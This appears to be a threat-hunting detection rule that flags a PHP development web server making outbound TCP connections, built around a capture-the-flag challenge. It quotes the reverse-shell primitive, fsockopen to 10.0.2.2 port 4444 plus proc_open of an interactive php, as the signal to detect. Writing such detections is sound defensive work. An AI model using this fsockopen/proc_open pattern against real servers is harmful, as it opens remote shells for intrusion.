PHP web-server process initiating outbound TCP (fsockopen reverse shell to attacker) AICommand & Control High
Hunts a `php -S` built-in development web server that initiates an OUTBOUND TCP connection — a dev/test HTTP server should only ever listen, never dial out. In the Off-the-SETUID challenge the injected PHP (`fsockopen("10.0.2.2",4444)` + `proc_open(['php','-a'])`) turns the eval'd web server into a reverse shell, so any egress attributed to the listening php process is the exploitation signal. Rationale: Anchored on the article's exact exploitation primitive: a `php -S 0:8080` listener (init.c) that, after PHP eval injection, runs `fsockopen("10.0.2.2",4444)`/`proc_open(['php','-a'])`. A listening dev server emitting outbound TCP is near-zero-FP. Cross-checked the php reverse-shell TTP against GTFOBins. Cross-checked against: • https://gtfobins.github.io/gtfobins/php/
